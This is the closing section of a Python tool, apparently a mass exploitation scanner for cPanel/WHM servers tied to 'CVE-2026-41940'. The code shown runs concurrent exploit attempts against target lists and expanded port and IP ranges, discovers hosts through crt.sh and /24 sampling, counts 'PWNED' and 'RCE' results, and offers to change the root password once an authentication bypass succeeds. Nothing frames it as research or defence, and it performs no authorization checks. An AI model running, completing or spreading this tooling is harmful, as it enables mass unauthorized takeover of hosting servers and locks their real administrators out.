                if hinted:
                    log_info("[EXPAND] weak panel hint — trying all service ports on base hosts...")
                    base_hosts = {ep.host for ep in valid_plan}
                    for bh in base_hosts:
                        if not exploit_all_open and pwned:
                            break
                        bh_ips = await resolve_all_ips(bh)
                        for ip in bh_ips or [bh]:
                            if not exploit_all_open and pwned:
                                break
                            for prt, sch, lbl in P4_PORTS:
                                if not exploit_all_open and pwned:
                                    break
                                ep = Endpoint(sch, ip, prt, f"P4-{lbl}", 4, "expanded")
                                if ep.key in tried_ep_keys:
                                    continue
                                if not await tcp_probe(ep.host, ep.port):
                                    continue
                                tried_ep_keys.add(ep.key)
                                log_step(
                                    f"[EXPLOIT] {ep.url_base}  label={ep.label}  src={ep.source}"
                                )
                                try:
                                    r = await self.exploit_endpoint(ep, timeout, new_password)
                                except Exception as e:
                                    r = {
                                        "endpoint": ep.url_base,
                                        "status": Status.ERROR,
                                        "detail": str(e),
                                    }
                                results.append(r)
                                if r.get("status") in (Status.PWNED, Status.PWNED_FULL):
                                    pwned = True

            if not results:
                results.append({"raw": raw, "status": Status.DNS_FAIL})

        return results

# ══════════════════════════════════════════════════════════
# Enhanced mass runner
# ══════════════════════════════════════════════════════════
async def run_mass_enhanced(
    targets: list[str],
    concurrency: int,
    timeout: int,
    new_password: str | None = None,
    discovery_only: bool = False,
    exploit_all_open: bool = False,
) -> None:
    os.makedirs(OUTPUT_DIR, exist_ok=True)
    if not _disk_writes_minimal_only():
        os.makedirs(STUDY_DIR, exist_ok=True)
        os.makedirs(CACHE_DIR, exist_ok=True)

    scanner = WHMScanner()
    sem = asyncio.Semaphore(concurrency)
    
    tasks = [
        asyncio.create_task(
            scanner.comprehensive_target_processing(
                t,
                timeout,
                sem,
                new_password,
                discovery_only,
                exploit_all_open,
            ))
        for t in targets
    ]

    stats: dict[str, int] = {s: 0 for s in (
        Status.PWNED_FULL, Status.PWNED,
        Status.STAGE2_NO_TOKEN, Status.STAGE3_FAIL, Status.STAGE4_NO_ROOT,
        Status.NOT_CPANEL, Status.NO_SESSION, Status.DNS_FAIL,
        Status.CONNECT_FAIL, Status.PASSWD_CHANGED, Status.PASSWD_FAIL,
        Status.ERROR, Status.INVALID, Status.DISCOVERY_ONLY,
    )}

    for coro in asyncio.as_completed(tasks):
        try:
            results = await coro
        except asyncio.CancelledError:
            raise
        except Exception as e:
            log_fail(f"task error: {e}")
            stats[Status.ERROR] += 1
            continue
        
        for r in results:
            s = r.get("status", Status.ERROR)
            stats[s] = stats.get(s, 0) + 1
            pc = r.get("passwd_change", {})
            if pc.get("attempted"):
                if pc.get("success"):
                    stats[Status.PASSWD_CHANGED] += 1
                else:
                    stats[Status.PASSWD_FAIL] += 1

    # Enhanced results summary
    sep = C_MUTED + "=" * 62 + Clr
    print()
    print(sep)
    log_full(f"PWNED_FULL  (bypass + proof)       : {stats[Status.PWNED_FULL]}")
    log_ok(  f"PWNED       (bypass confirmed)     : {stats[Status.PWNED]}")
    if new_password:
        log_pass(f"PASSWD_CHANGED (root pw changed)   : {stats[Status.PASSWD_CHANGED]}")
        log_fail(f"PASSWD_FAIL    (pw change failed)   : {stats[Status.PASSWD_FAIL]}")
    log_fail(f"STAGE4_NO_ROOT                     : {stats[Status.STAGE4_NO_ROOT]}")
    log_fail(f"STAGE3_FAIL (gadget miss)           : {stats[Status.STAGE3_FAIL]}")
    log_fail(f"STAGE2_NO_TOKEN                    : {stats[Status.STAGE2_NO_TOKEN]}")
    log_info(f"NO_SESSION                         : {stats[Status.NO_SESSION]}")
    log_info(f"NOT_cPanel                         : {stats[Status.NOT_CPANEL]}")
    log_fail(f"CONNECT_FAIL                       : {stats[Status.CONNECT_FAIL]}")
    log_fail(f"DNS_FAIL                           : {stats[Status.DNS_FAIL]}")
    log_fail(f"ERROR                              : {stats[Status.ERROR]}")
    log_discovery(f"DISCOVERY_ONLY (fingerprints)     : {stats[Status.DISCOVERY_ONLY]}")
    print(sep)
    if _disk_writes_minimal_only():
        log_ok(f"Outputs (minimal) -> folder {os.path.abspath(OUTPUT_DIR)}")
        log_full(f"RCE               -> {os.path.abspath(RCE_FILE)}")
        if new_password:
            log_pass(f"Passwd            -> {os.path.abspath(PASSWD_FILE)}")
    else:
        log_ok(  f"Results           -> {RESULTS_FILE}")
        log_ok(  f"Vuln              -> {VULN_FILE}")
        log_full(f"RCE               -> {RCE_FILE}")
        if new_password:
            log_pass(f"Passwd            -> {PASSWD_FILE}")
        log_ok(  f"WHM_Confirmed     -> {WHM_CONFIRMED_FILE}")
        log_ok(  f"WHM_Likely        -> {WHM_LIKELY_FILE}")
        log_ok(  f"IP_WHM            -> {IP_WHM_FILE}")
        log_discovery(f"Discovery         -> {DISCOVERY_FILE}")
        log_discovery(f"Intelligence      -> {INTELLIGENCE_FILE}")
        log_info(f"Fingerprints      -> {FINGERPRINTS_FILE}")
        log_info(f"Nx_Ips            -> {STUDY_DIR}/")
        log_warn(f"Errors            -> {ERRORS_FILE}")
    print(sep)

# ══════════════════════════════════════════════════════════
# Enhanced header display
# ══════════════════════════════════════════════════════════
def draw_header() -> None:
    os.system("cls" if os.name == "nt" else "clear")
    print(BANNER)

    _inner = _UI_W - 4

    def _bx_row(plain: str) -> None:
        t = plain[:_inner]
        pad = max(0, _inner - len(t))
        print(f"{C_BLK}║ {C_TX}{t}{pad * ' '}{C_BLK} ║{Clr}")

    print(f"{C_BLK}╔{(_UI_W - 2) * '═'}╗{Clr}")
    _bx_row("")
    p1 = "  "
    hi = "OPERATIONS MATRIX"
    p2 = "  —  session reference"
    pad0 = max(0, _inner - len(p1) - len(hi) - len(p2))
    print(
        f"{C_BLK}║ {p1}{C_HI}{hi}{C_TX}{p2}{pad0 * ' '}{C_BLK} ║{Clr}"
    )
    _bx_row("")
    extras = [
        "  › Run bare: python Ip.py  →  full interactive wizard (defaults on Enter)",
        "  › Outputs   Nx_RCE.txt + Nx_passwd.txt under chosen folder",
        "  › Optional verbose disk  + study cache (answered in wizard)",
        "  › Discovery PTR+forward, /24, crt.sh, SAN, subdomain matrix",
        "  › Coverage levels: first-hit │ all-open sockets │ exhaustive+wide CT",
        "  › Wins append immediately to result files / flush disk",
        "  › Proto     scheme auto-mapped per service port",
    ]
    for ln in extras:
        _bx_row(ln)
    _bx_row("")
    print(f"{C_BLK}╚{(_UI_W - 2) * '═'}╝{Clr}")
    print()

def ask(prompt: str, default: str) -> str:
    try:
        v = input(
            f"{C_BLK}▸{Clr} {C_TX}{prompt}{Clr} {C_MUTED}[{default}]:{Clr} "
        ).strip()
        return v if v else default
    except (EOFError, KeyboardInterrupt):
        return default

def ask_int(prompt: str, default: int, lo: int, hi: int) -> int:
    try:
        v = int(ask(prompt, str(default)))
        return max(lo, min(hi, v))
    except (ValueError, EOFError):
        return default


def ask_yes_no(prompt: str, default: bool) -> bool:
    """y/yes/1 = True, n/no/0 = False, Enter = default."""
    hint = "Y/n" if default else "y/N"
    try:
        v = input(
            f"{C_BLK}▸{Clr} {C_TX}{prompt}{Clr} {C_MUTED}[{hint} — Enter=default]:{Clr} "
        ).strip().lower()
    except (EOFError, KeyboardInterrupt):
        return default
    if not v:
        return default
    if v in ("y", "yes", "1", "true", "t"):
        return True
    if v in ("n", "no", "0", "false", "f"):
        return False
    return default


def interactive_wizard() -> dict:
    """
    Fully interactive setup — Enter keeps the bracketed default.
    """
    sep = C_MUTED + "─" * min(76, _UI_W - 2) + Clr
    print(f"\n{sep}")
    print(f"{C_HI}  INTERACTIVE RUN SETUP  {Clr}{C_DIMTX}(empty line = default in brackets){Clr}")
    print(f"{sep}\n")

    out_dir = ask("Results folder path", OUTPUT_DIR or "Nx_Output").strip()
    if not out_dir:
        out_dir = "Nx_Output"

    full_logs = ask_yes_no("Write extended disk logs (fingerprints, proofs, sidecars)", False)

    inp = ask(
        f"Targets: file path OR one full URL [{DEFAULT_TARGETS}]",
        DEFAULT_TARGETS,
    ).strip()
    if inp.startswith(("http://", "https://")):
        targets = [inp]
        concurrency = 1
    else:
        if not os.path.isfile(inp):
            log_warn(f"[i] File not found yet: {inp!r} — will fail if missing at run")
        targets = load_targets(inp)
        if not targets:
            log_fail("[!] No valid targets in file. Add one URL/host per line.")
            sys.exit(1)
        concurrency = ask_int(
            f"Parallel workers per wave (max {MAX_CONC})", DEFAULT_CONC, 1, MAX_CONC
        )

    timeout = ask_int(
        "HTTP timeout per stage (seconds)", DEFAULT_TIMEOUT, 5, 120
    )

    discovery_only = ask_yes_no(
        "Discovery / fingerprint ONLY (skip exploit bypass)", False
    )

    password: str | None = None
    if not discovery_only:
        do_pw = ask_yes_no("Attempt root password change after successful bypass", True)
        if do_pw:
            while True:
                password = ask(
                    "New root password (min 8 chars; blank=cancel pwd step)",
                    "",
                ).strip()
                if not password:
                    password = None
                    log_info("[i] Password change disabled (blank).")
                    break
                if len(password) >= 8:
                    break
                log_fail("[!] Password too short — need 8+ characters or blank.")
    print(
        f"\n{C_DIMTX}"
        "  Coverage ▸  [1] stop after FIRST successful PWN on this input\n"
        "              [2] try EVERY TCP-open endpoint (derived + plan), no early stop\n"
        "              [3] Maximum: like (2) + wide CT/PTR/P24-derived ports (recommended)"
        f"{Clr}"
    )
    cov_raw = ask("Choose 1 / 2 / 3", "3").strip().lower()
    if cov_raw in ("1", "one", "b", "balanced"):
        exploit_all_open = False
        exhaustive = False
    elif cov_raw in ("2", "two", "w", "wide"):
        exploit_all_open = True
        exhaustive = False
    else:
        exploit_all_open = True
        exhaustive = True

    max_ct_answer = ask(
        "crt.sh max hostnames per base domain "
        "(number, or blank = auto — 600 normal, 2500 if Maximum coverage)",
        "",
    ).strip()
    range_cap_answer = ask(
        "IPv4 /24 stratified sample size (blank = auto — 384 normal, ~1536 if Maximum)",
        "",
    ).strip()

    max_ct: int | None = None
    if max_ct_answer:
        try:
            max_ct = max(50, min(4000, int(max_ct_answer)))
        except ValueError:
            max_ct = None
            log_warn("[i] Invalid crt cap — using auto.")

    range_cap_user: int | None = None
    if range_cap_answer:
        try:
            range_cap_user = max(32, min(2048, int(range_cap_answer)))
        except ValueError:
            range_cap_user = None
            log_warn("[i] Invalid /24 cap — using auto.")

    return {
        "output_dir": out_dir,
        "full_logs": full_logs,
        "targets": targets,
        "concurrency": concurrency,
        "timeout": timeout,
        "password": password,
        "discovery_only": discovery_only,
        "exploit_all_open": exploit_all_open,
        "exhaustive": exhaustive,
        "max_ct_names": max_ct,
        "range_cap": range_cap_user,
    }


def apply_config_dict(cfg: dict) -> tuple[list[str], int, int, str | None, bool, bool]:
    """Apply globals from cfg dict; returns (targets, concurrency, timeout, password, discovery_only, exploit_all)."""
    apply_output_dir(cfg["output_dir"])
    set_minimal_disk_output(not cfg["full_logs"])

    exhaustive = bool(cfg.get("exhaustive"))
    set_exhaustive_mode(exhaustive)

    if cfg.get("max_ct_names") is not None:
        set_max_ct_names(cfg["max_ct_names"])
    elif exhaustive:
        set_max_ct_names(2500)

    if cfg.get("range_cap") is not None:
        set_range_sample_cap(cfg["range_cap"])
    elif exhaustive:
        set_range_sample_cap(min(1536, 2048))

    exploit_all = bool(cfg.get("exploit_all_open") or exhaustive)
    return (
        cfg["targets"],
        cfg["concurrency"],
        cfg["timeout"],
        cfg["password"],
        cfg["discovery_only"],
        exploit_all,
    )


def build_config_from_argparse(ns) -> dict:
    od = getattr(ns, "output_dir", None) or OUTPUT_DIR
    pwd = getattr(ns, "password", None)
    ex = getattr(ns, "exhaustive", False)
    eao = getattr(ns, "exploit_all_open", False)
    return {
        "output_dir": od,
        "full_logs": bool(getattr(ns, "full_logs", False)),
        "targets": [],  # filled by caller
        "concurrency": int(getattr(ns, "concurrency", DEFAULT_CONC) or DEFAULT_CONC),
        "timeout": int(getattr(ns, "timeout", DEFAULT_TIMEOUT)),
        "password": pwd,
        "discovery_only": bool(getattr(ns, "discovery_only", False)),
        "exploit_all_open": eao,
        "exhaustive": ex,
        "max_ct_names": getattr(ns, "max_ct_names", None),
        "range_cap": getattr(ns, "range_cap", None),
    }

# ══════════════════════════════════════════════════════════
# Enhanced main function
# ══════════════════════════════════════════════════════════
def main() -> None:
    draw_header()

    parser = argparse.ArgumentParser(
        description="Enhanced cPanel/WHM scanner — CVE-2026-41940 · run with NO args for full menu")
    parser.add_argument("-t", "--targets",     default=None,
                        help="targets file")
    parser.add_argument("--target",            default=None,
                        help="single URL")
    parser.add_argument("-c", "--concurrency", type=int, default=None)
    parser.add_argument("--timeout",           type=int, default=DEFAULT_TIMEOUT)
    parser.add_argument("--password",          default=None)
    parser.add_argument("--discovery-only",   action="store_true")
    parser.add_argument("--full-logs", action="store_true")
    parser.add_argument("--output-dir", default=None)
    parser.add_argument("--range-cap", type=int, default=None)
    parser.add_argument("--exploit-all-open", action="store_true")
    parser.add_argument("--max-ct-names", type=int, default=None)
    parser.add_argument("--exhaustive", action="store_true")

    use_cli = len(sys.argv) > 1
    cfg: dict

    if not use_cli:
        cfg = interactive_wizard()
    else:
        args = parser.parse_args()
        cfg = build_config_from_argparse(args)
        if args.target:
            cfg["targets"] = [args.target]
            cfg["concurrency"] = 1
            cfg["timeout"] = args.timeout
        elif args.targets:
            cfg["targets"] = load_targets(args.targets)
            cfg["concurrency"] = args.concurrency or DEFAULT_CONC
            cfg["timeout"] = args.timeout
            if not cfg["targets"]:
                sys.exit(1)
        else:
            log_fail("CLI mode: pass --target URL or -t file.txt  (or run bare: python Ip.py)")
            sys.exit(2)
        if args.exhaustive:
            cfg["exhaustive"] = True
        if args.exploit_all_open:
            cfg["exploit_all_open"] = True

    (
        targets,
        concurrency,
        timeout,
        password,
        discovery_only,
        exploit_all_open,
    ) = apply_config_dict(cfg)

    if password and len(password) < 8:
        log_fail("[!] Password must be at least 8 characters")
        sys.exit(1)

    _s = _UI_W - 2
    print(f"{C_BLK}┌{_s * '─'}┐{Clr}")
    print(f"{C_BLK}│{Clr} {C_HI}RUN PROFILE{Clr}")
    print(f"{C_BLK}├{_s * '─'}┤{Clr}")
    print(f"{C_BLK}│{Clr} {C_TX}Targets      {C_BLK}:{Clr} {len(targets)}")
    print(f"{C_BLK}│{Clr} {C_TX}Workers      {C_BLK}:{Clr} {concurrency}")
    print(f"{C_BLK}│{Clr} {C_TX}Timeout      {C_BLK}:{Clr} {timeout}s")
    print(f"{C_BLK}│{Clr} {C_TX}Output dir   {C_BLK}:{Clr} {os.path.abspath(OUTPUT_DIR)}")
    mode = "extended disk" if cfg["full_logs"] else "minimal (RCE + passwd core files)"
    print(f"{C_BLK}│{Clr} {C_TX}Disk mode    {C_BLK}:{Clr} {mode}")
    print(f"{C_BLK}│{Clr} {C_TX}/24 sample   {C_BLK}:{Clr} up to {RANGE_SAMPLE_CAP} hosts / resolved IPv4")
    print(f"{C_BLK}│{Clr} {C_TX}CT cap       {C_BLK}:{Clr} up to {_MAX_CT_NAMES} names / domain")
    if discovery_only:
        print(f"{C_BLK}│{Clr} {Fore.YELLOW}Mode         {C_BLK}:{Clr} Discovery only (no bypass)")
    if exploit_all_open:
        print(f"{C_BLK}│{Clr} {Fore.YELLOW}Exploit      {C_BLK}:{Clr} iterate ALL open sockets (no early exit)")
    if cfg.get("exhaustive"):
        print(f"{C_BLK}│{Clr} {Fore.YELLOW}Coverage     {C_BLK}:{Clr} EXHAUSTIVE matrix (derived hosts × full ports)")
    if password:
        print(f"{C_BLK}│{Clr} {C_HI}Password     {C_BLK}:{Clr} {'*' * len(password)} "
              f"{C_DIMTX}(post-bypass){Clr}")
    print(f"{C_BLK}└{_s * '─'}┘{Clr}")
    print()

    os.makedirs(OUTPUT_DIR, exist_ok=True)
    if cfg["full_logs"]:
        os.makedirs(STUDY_DIR, exist_ok=True)
        os.makedirs(CACHE_DIR, exist_ok=True)

    try:
        asyncio.run(
            run_mass_enhanced(
                targets,
                concurrency,
                timeout,
                password,
                discovery_only,
                exploit_all_open,
            )
        )
    except KeyboardInterrupt:
        print(f"\n{C_HI}[CTRL+C]{Clr} {C_TX}interrupted{Clr}")

if __name__ == "__main__":
    main()
